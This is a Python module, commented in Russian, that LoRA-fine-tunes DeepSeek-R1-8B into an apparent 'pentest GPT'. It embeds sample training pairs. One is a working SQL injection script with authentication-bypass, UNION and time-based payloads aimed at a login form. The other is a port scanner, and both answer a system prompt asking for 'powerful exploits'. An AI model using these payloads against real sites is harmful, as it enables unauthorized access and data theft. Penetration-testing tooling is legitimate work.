"""
Модуль LoRA-дообучения для my-pentest-gpt
Обучает DeepSeek-R1-8B на специализированных данных
"""
import os
import torch
import logging
from pathlib import Path
from typing import Optional, Dict, Any
from transformers import (
    AutoModelForCausalLM,
    AutoTokenizer,
    Trainer,
    TrainingArguments,
    DataCollatorForLanguageModeling
)
from peft import (
    get_peft_config,
    get_peft_model,
    LoraConfig,
    TaskType,
    PeftModel
)
from datasets import load_dataset, Dataset
import json

from .config import (
    MODEL_CONFIG,
    LORA_CONFIG,
    TRAINING_CONFIG,
    MODEL_PATH,
    OUTPUT_DIR,
    DATA_DIR
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class LoRATrainer:
    """Тренер для LoRA-дообучения DeepSeek-R1-8B"""

    def __init__(
        self,
        base_model_path: Optional[str] = None,
        output_dir: Optional[Path] = None
    ):
        self.base_model_path = base_model_path or MODEL_CONFIG["model_name"]
        self.output_dir = output_dir or OUTPUT_DIR
        self.model = None
        self.tokenizer = None

        self.output_dir.mkdir(parents=True, exist_ok=True)

    def prepare_model(self) -> None:
        """Подготавливает модель для обучения"""
        logger.info(f"Загрузка базовой модели: {self.base_model_path}")

        self.tokenizer = AutoTokenizer.from_pretrained(
            self.base_model_path,
            trust_remote_code=True,
            padding_side="right"
        )

        if self.tokenizer.pad_token is None:
            self.tokenizer.pad_token = self.tokenizer.eos_token

        self.model = AutoModelForCausalLM.from_pretrained(
            self.base_model_path,
            torch_dtype=torch.float16,
            device_map="auto",
            trust_remote_code=True
        )

        peft_config = LoraConfig(
            task_type=TaskType.CAUSAL_LM,
            inference_mode=False,
            r=LORA_CONFIG["r"],
            lora_alpha=LORA_CONFIG["lora_alpha"],
            lora_dropout=LORA_CONFIG["lora_dropout"],
            target_modules=LORA_CONFIG["target_modules"]
        )

        self.model = get_peft_model(self.model, peft_config)
        self.model.print_trainable_parameters()

        logger.info("Модель подготовлена для LoRA обучения")

    def prepare_dataset(self, data_path: Path) -> Dataset:
        """
        Подготавливает датасет для обучения

        Args:
            data_path: Путь к файлу с данными (JSONL формат)

        Returns:
            Подготовленный датасет
        """
        logger.info(f"Загрузка датасета из: {data_path}")

        if not data_path.exists():
            raise FileNotFoundError(f"Файл данных не найден: {data_path}")

        dataset = load_dataset("json", data_files=str(data_path))["train"]

        def preprocess_function(examples):
            """Предобрабатывает примеры для обучения"""
            texts = []
            for prompt, completion in zip(examples["prompt"], examples["completion"]):
                text = f"{prompt}\n{completion}{self.tokenizer.eos_token}"
                texts.append(text)

            tokenized = self.tokenizer(
                texts,
                truncation=True,
                max_length=TRAINING_CONFIG["seq_length"],
                padding=False
            )

            tokenized["labels"] = tokenized["input_ids"].copy()

            return tokenized

        processed_dataset = dataset.map(
            preprocess_function,
            batched=True,
            remove_columns=dataset.column_names
        )

        logger.info(f"Датасет подготовлен: {len(processed_dataset)} примеров")
        return processed_dataset

    def train(
        self,
        dataset: Dataset,
        epochs: int = None,
        batch_size: int = None,
        learning_rate: float = None
    ) -> None:
        """
        Запускает обучение LoRA

        Args:
            dataset: Подготовленный датасет
            epochs: Количество эпох
            batch_size: Размер батча
            learning_rate: Скорость обучения
        """
        if self.model is None:
            raise ValueError("Модель не подготовлена. Вызовите prepare_model() сначала.")

        epochs = epochs or TRAINING_CONFIG["epochs"]
        batch_size = batch_size or TRAINING_CONFIG["batch_size"]
        learning_rate = learning_rate or TRAINING_CONFIG["learning_rate"]

        training_args = TrainingArguments(
            output_dir=str(self.output_dir),
            num_train_epochs=epochs,
            per_device_train_batch_size=batch_size,
            gradient_accumulation_steps=TRAINING_CONFIG["gradient_accumulation_steps"],
            learning_rate=learning_rate,
            fp16=TRAINING_CONFIG["fp16"],
            logging_steps=50,
            save_steps=200,
            save_total_limit=3,
            remove_unused_columns=False,
            dataloader_drop_last=True,
            warmup_steps=100,
            optim="adamw_torch",
            report_to="none"
        )

        data_collator = DataCollatorForLanguageModeling(
            tokenizer=self.tokenizer,
            mlm=False
        )

        trainer = Trainer(
            model=self.model,
            args=training_args,
            train_dataset=dataset,
            tokenizer=self.tokenizer,
            data_collator=data_collator
        )

        logger.info("Начинаем обучение LoRA...")

        trainer.train()

        trainer.save_model()
        self.tokenizer.save_pretrained(self.output_dir)

        logger.info(f"Обучение завершено. Модель сохранена в: {self.output_dir}")

    def create_sample_dataset(self, output_path: Path) -> None:
        """
        Создает пример датасета для обучения

        Args:
            output_path: Путь для сохранения примера
        """
        sample_data = [
            {
                "prompt": "<|system|>\nТы эксперт по кибербезопасности. Создавай мощные PoC и эксплойты.\n<|user|>\nСоздай скрипт для тестирования SQL инъекции в веб-форме\n<|assistant|>\n",
                "completion": '''
# SQL Injection Tester - Мощный инструмент для тестирования

import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import time

def test_sql_injection(url):
    """
    Тестирование SQL инъекции в веб-форме входа
    """

    # Базовые payload'ы для SQL инъекции
    payloads = [
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT NULL,username,password FROM users--",
        "' OR 1=1 LIMIT 1 --",
        "1' OR '1'='1",
        "' OR 'a'='a",
        "') OR ('1'='1' --",
        "' OR 1=1#",
        "' UNION ALL SELECT 1,2,3,4,5--"
    ]

    successful_payloads = []

    for payload in payloads:
        try:
            test_params = {
                'username': payload,
                'password': 'test',
                'login': payload,
                'user': payload,
                'email': payload
            }

            response = requests.post(url, data=test_params, timeout=10)

            success_indicators = [
                'welcome', 'dashboard', 'admin', 'user panel',
                'logged in', 'authentication successful'
            ]

            error_indicators = [
                'mysql_fetch', 'ORA-', 'Microsoft OLE DB',
                'PostgreSQL', 'SQLite', 'syntax error'
            ]

            response_lower = response.text.lower()

            if any(indicator in response_lower for indicator in success_indicators):
                successful_payloads.append({
                    'payload': payload,
                    'type': 'Authentication Bypass',
                    'response_length': len(response.text)
                })
                print(f"✅ Успешная инъекция: {payload}")

            elif any(error in response_lower for error in error_indicators):
                successful_payloads.append({
                    'payload': payload,
                    'type': 'Error-based SQL Injection',
                    'response_length': len(response.text)
                })
                print(f"⚠️ Ошибка БД обнаружена: {payload}")

            time.sleep(0.5)

        except requests.exceptions.RequestException as e:
            print(f"❌ Ошибка запроса для {payload}: {e}")

    return successful_payloads

def advanced_sql_test(url, param_name='id'):
    """Продвинутое тестирование SQL инъекции"""

    union_payloads = [
        f"1' UNION SELECT 1,version(),database(),user()--",
        f"1' UNION SELECT 1,table_name,null,null FROM information_schema.tables--",
        f"1' UNION SELECT 1,column_name,null,null FROM information_schema.columns--"
    ]

    time_payloads = [
        f"1'; WAITFOR DELAY '00:00:05'--",
        f"1' OR SLEEP(5)--",
        f"1'; SELECT pg_sleep(5)--"
    ]

    results = []

    for payload in union_payloads + time_payloads:
        try:
            start_time = time.time()
            response = requests.get(f"{url}?{param_name}={urllib.parse.quote(payload)}", timeout=10)
            end_time = time.time()

            response_time = end_time - start_time

            if response_time > 4:
                results.append({
                    'payload': payload,
                    'type': 'Time-based SQL Injection',
                    'response_time': response_time
                })
                print(f"⏰ Time-based инъекция: {payload} ({response_time:.2f}s)")

            if 'mysql' in response.text.lower() or 'version' in response.text.lower():
                results.append({
                    'payload': payload,
                    'type': 'Union-based SQL Injection',
                    'response_length': len(response.text)
                })
                print(f"🔍 Union-based инъекция: {payload}")

        except Exception as e:
            print(f"❌ Ошибка: {e}")

    return results

if __name__ == "__main__":
    target_url = "http://vulnerable-site.com/login"
    results = test_sql_injection(target_url)
    advanced_results = advanced_sql_test("http://vulnerable-site.com/product.php")

    print(f"\n📊 Найдено уязвимостей: {len(results + advanced_results)}")
'''
            },
            {
                "prompt": "<|system|>\nТы эксперт по кибербезопасности. Создавай мощные инструменты для пентестинга.\n<|user|>\nНапиши скрипт для сканирования портов\n<|assistant|>\n",
                "completion": """```python
import socket
from concurrent.futures import ThreadPoolExecutor
import argparse

def scan_port(host, port, timeout=1):
    '''Сканирует один порт на хосте'''
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            return port if result == 0 else None
    except:
        return None

def port_scanner(host, start_port=1, end_port=1000, threads=100):
    '''Сканирует диапазон портов'''
    print(f"Сканирование {host} портов {start_port}-{end_port}")

    open_ports = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(scan_port, host, port): port
            for port in range(start_port, end_port + 1)
        }

        for future in futures:
            result = future.result()
            if result:
                open_ports.append(result)
                print(f"Порт {result} открыт")

    return sorted(open_ports)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Целевой хост")
    parser.add_argument("-p", "--ports", default="1-1000",
                       help="Диапазон портов (например: 1-1000)")

    args = parser.parse_args()

    start, end = map(int, args.ports.split('-'))
    open_ports = port_scanner(args.host, start, end)

    print(f"\nНайдено открытых портов: {len(open_ports)}")
```"""
            }
        ]

        # Сохраняем в JSONL формате
        with open(output_path, 'w', encoding='utf-8') as f:
            for item in sample_data:
                f.write(json.dumps(item, ensure_ascii=False) + '\n')

        logger.info(f"Пример датасета создан: {output_path}")

def train_lora(
    data_path: Optional[Path] = None,
    epochs: int = 3,
    batch_size: int = 8,
    learning_rate: float = 3e-4
) -> None:
    """
    Главная функция для LoRA обучения

    Args:
        data_path: Путь к данным для обучения
        epochs: Количество эпох
        batch_size: Размер батча
        learning_rate: Скорость обучения
    """
    # Используем путь по умолчанию если не указан
    if data_path is None:
        data_path = DATA_DIR / "exploits.jsonl"

    # Создаем пример данных если файл не существует
    if not data_path.exists():
        logger.warning(f"Файл данных не найден: {data_path}")
        logger.info("Создаем пример датасета...")

        data_path.parent.mkdir(parents=True, exist_ok=True)
        trainer = LoRATrainer()
        trainer.create_sample_dataset(data_path)

    # Инициализируем тренер
    trainer = LoRATrainer()

    try:
        # Подготавливаем модель
        trainer.prepare_model()

        # Подготавливаем датасет
        dataset = trainer.prepare_dataset(data_path)

        # Запускаем обучение
        trainer.train(dataset, epochs, batch_size, learning_rate)

        logger.info("LoRA обучение успешно завершено!")

    except Exception as e:
        logger.error(f"Ошибка во время обучения: {e}")
        raise

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="LoRA обучение DeepSeek-R1-8B")
    parser.add_argument("--data", type=Path, help="Путь к файлу данных (JSONL)")
    parser.add_argument("--epochs", type=int, default=3, help="Количество эпох")
    parser.add_argument("--batch-size", type=int, default=8, help="Размер батча")
    parser.add_argument("--lr", type=float, default=3e-4, help="Скорость обучения")

    args = parser.parse_args()

    train_lora(args.data, args.epochs, args.batch_size, args.lr)
